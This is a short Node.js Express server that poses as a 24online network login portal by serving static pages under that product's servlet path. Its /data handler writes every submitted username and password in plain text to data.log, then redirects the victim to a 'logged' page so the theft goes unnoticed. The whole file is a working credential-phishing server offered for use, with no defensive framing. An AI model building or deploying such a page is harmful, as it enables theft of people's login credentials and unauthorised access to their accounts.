const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');

const PORT = process.argv[2] | 3000
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

app.use('/24online/servlet/E24onlineHTTPClient', express.static('static'));

app.get('/', (req, res) => {
    res.redirect('/24online/servlet/E24onlineHTTPClient')
})

app.post('/data', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    fs.appendFile('data.log', `${username}:${password}\n`, function (err) {
        if (err) throw err;
      });
    res.redirect('/24online/servlet/E24onlineHTTPClient/logged.html')
})

app.listen(PORT, () => {
    console.log(`server started on port ${PORT} ...`);
})